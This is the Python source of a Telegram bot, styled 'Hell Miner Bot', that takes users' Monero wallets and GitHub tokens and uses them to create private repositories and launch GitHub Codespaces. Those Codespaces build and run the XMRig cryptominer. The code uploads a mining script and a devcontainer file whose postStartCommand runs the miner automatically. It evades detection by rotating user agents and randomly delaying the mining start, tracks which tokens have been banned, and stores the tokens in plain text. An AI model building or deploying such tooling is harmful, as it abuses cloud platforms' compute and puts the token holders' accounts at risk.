import telebot
import requests
import json
import base64
import subprocess
import time
import random
import string
import os

BOT_TOKEN = 'ds'
bot = telebot.TeleBot(BOT_TOKEN)

TOKEN_FILE = "token.txt"
WALLET_FILE = "wallets.txt"
USED_NAMES_FILE = "troe.txt"

user_wallets = {}
user_tokens = {}
used_names = set()

# Load used repo/script names
if os.path.exists(USED_NAMES_FILE):
    with open(USED_NAMES_FILE) as f:
        used_names.update(f.read().splitlines())

# Load wallets
if os.path.exists(WALLET_FILE):
    with open(WALLET_FILE) as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) == 2:
                user_wallets[int(parts[0])] = parts[1]

# Load user tokens
if os.path.exists(TOKEN_FILE):
    with open(TOKEN_FILE) as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) == 2:
                user_tokens.setdefault(int(parts[0]), []).append(parts[1])

def get_unique_name(length=6):
    while True:
        name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        if name not in used_names:
            used_names.add(name)
            with open(USED_NAMES_FILE, "a") as f:
                f.write(name + "\n")
            return name

def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Android 11; Mobile; rv:89.0)",
    ]
    return random.choice(agents)

@bot.message_handler(commands=['start'])
def start_cmd(message):
    devil_face = "😈"
    fire = "🔥"
    skull = "💀"
    lightning = "⚡️"
    book = "📖"
    pickaxe = "⛏️"
    robot = "🤖"
    check = "✅"
    cross = "❌"

    text = f"""{devil_face} *WELCOME TO HELL MINER BOT* {devil_face}

{fire} *I AM DEVIL BY SOUL... AND YOU'RE HERE TO BURN CPUs!* {fire}

{book} *HOW TO MAKE YOUR GITHUB WORK FOR YOU:*  
1️⃣ Type `/wallet <your_monero_wallet>`  
{check} _This will store your mining wallet_  

2️⃣ Type `/token <your_github_token>`  
{check} _I’ll rip GitHub apart and mine with it_  

3️⃣ Sit back and *watch the magic* {lightning}  
{robot} _I’ll create repos, fire up Codespaces, and mine like a beast!_  

{pickaxe} *Wanna check your status?*  
Type `/check` to see your *Active* and *Banned* tokens.

{skull} Don’t worry, I never forget your wallet. Even if you restart, it stays in my evil memory!

---
{cross} *No admin needed* — This is open to all brave souls.
{devil_face} The darker your soul, the faster you mine.

👉 _Ready to sell your soul to the Hashrate gods?_  
Then let's *begin the ritual!* 🔥
"""
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['wallet'])
def set_wallet(message):
    try:
        wallet = message.text.split()[1]
        user_wallets[message.chat.id] = wallet

        with open(WALLET_FILE, "a") as f:
            f.write(f"{message.chat.id}:{wallet}\n")

        bot.reply_to(message, "✅ Wallet saved! You're ready to mine.")
    except:
        bot.reply_to(message, "⚠️ Usage: /wallet <wallet_address>")

@bot.message_handler(commands=['token'])
def set_token(message):
    if message.chat.id not in user_wallets:
        bot.reply_to(message, "⚠️ Set wallet first using /wallet <wallet>")
        return

    try:
        token = message.text.split()[1]
        wallet = user_wallets[message.chat.id]
        user_agent = get_random_user_agent()

        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": user_agent
        }

        user_resp = requests.get("https://api.github.com/user", headers=headers)
        if user_resp.status_code != 200:
            bot.reply_to(message, "❌ Invalid GitHub token.")
            return

        username = user_resp.json()["login"]
        bot.reply_to(message, f"""
😈 *GITHUB POSSESSED SUCCESSFULLY!* 😈


🧠 Logged in as: `{username}`
🔨 Summoning dark repositories...
⏳ Wait while I cast the spell of infinite mining...

🔥 Let the Codespace ritual begin!
""", parse_mode="Markdown")

        for _ in range(2):
            repo = get_unique_name()
            sh_name = get_unique_name() + ".sh"

            requests.delete(f"https://api.github.com/repos/{username}/{repo}", headers=headers)
            requests.post("https://api.github.com/user/repos", headers=headers, json={
                "name": repo, "private": True, "auto_init": True
            })

            soulsh = f"""#!/bin/bash
WALLET="{wallet}"
POOL="pool.supportxmr.com:7777"
WORKER="{get_unique_name()}"

echo "[+] Starting setup..."

install_dependencies() {{
    apt update && apt install sudo && sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
}}

build_xmrig() {{
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    cmake ..
    make -j$(nproc)
}}

start_mining() {{
    sleep $((60 + RANDOM % 60))
    ./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero
}}

if [ -d "xmrig" ]; then
    cd xmrig/build
else
    install_dependencies
    build_xmrig
fi

start_mining
"""

            devcontainer = {
                "name": "XMRig Miner",
                "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
                "features": {
                    "ghcr.io/devcontainers/features/sshd:1": {
                        "version": "latest"
                    }
                },
                "postStartCommand": f"chmod +x {sh_name} && ./{sh_name}"
            }

            def upload(repo_name, path, content):
                url = f"https://api.github.com/repos/{username}/{repo_name}/contents/{path}"
                b64 = base64.b64encode(content.encode()).decode()
                return requests.put(url, headers=headers, json={
                    "message": f"Add {path}",
                    "content": b64,
                    "branch": "main"
                })

            upload(repo, sh_name, soulsh)
            upload(repo, ".devcontainer/devcontainer.json", json.dumps(devcontainer, indent=2))

            subprocess.run(f'echo {token} | gh auth login --with-token', shell=True, text=True, input=token)

            # Attempt to create a codespace and handle errors
            try:
                result = subprocess.run(f'gh codespace create --repo {username}/{repo} --machine standardLinux32gb', 
                                        shell=True, check=True, text=True, capture_output=True)
                if result.returncode == 0:
                    bot.reply_to(message, "✅ Codespaces started and mining configured with XMRig 🧠💰")
                else:
                    raise Exception(f"Failed to create Codespace: {result.stderr}")
            except subprocess.CalledProcessError as e:
                error_message = e.stderr
                if "402" in error_message:
                    bot.reply_to(message, "❌ Failed to Create Error: Billing issue or insufficient credits. Please check your GitHub billing settings or ensure you have available credits.")
                elif "403" in error_message:
                    bot.reply_to(message, "❌ Failed to Create Error: You are not allowed to create Codespaces. This may be due to permissions or GitHub plan restrictions.")
                elif "400" in error_message:
                    bot.reply_to(message, "❌ Failed to Create Error: Bad request, check your GitHub permissions.")
                else:
                    bot.reply_to(message, f"❌ Failed to Create Error: {error_message}. Please make sure your GitHub account is fully set up and eligible for Codespaces.")
                return


        # Save token
        user_tokens.setdefault(message.chat.id, []).append(token)
        with open(TOKEN_FILE, "a") as f:
            f.write(f"{message.chat.id}:{token}\n")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        

@bot.message_handler(commands=['check'])
def check_tokens(message):
    tokens = user_tokens.get(message.chat.id, [])
    if not tokens:
        bot.reply_to(message, "⚠️ No tokens found for your account.")
        return

    active = 0
    banned = 0

    for token in tokens:
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": get_random_user_agent()
        }
        resp = requests.get("https://api.github.com/user", headers=headers)
        if resp.status_code == 200:
            active += 1
        else:
            banned += 1

    msg = f"""👤 *Your GitHub Account Status*
━━━━━━━━━━━━━━━
✅ Active Tokens: `{active}`
❌ Banned Tokens: `{banned}`
💾 Total Provided: `{len(tokens)}`
━━━━━━━━━━━━━━━"""
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

while True:
    try:
        print("🤖 Bot polling started...")
        bot.polling(non_stop=True, timeout=30) 
    except Exception as e:
        print(f"🔥 Polling error: {e}")
        time.sleep(5)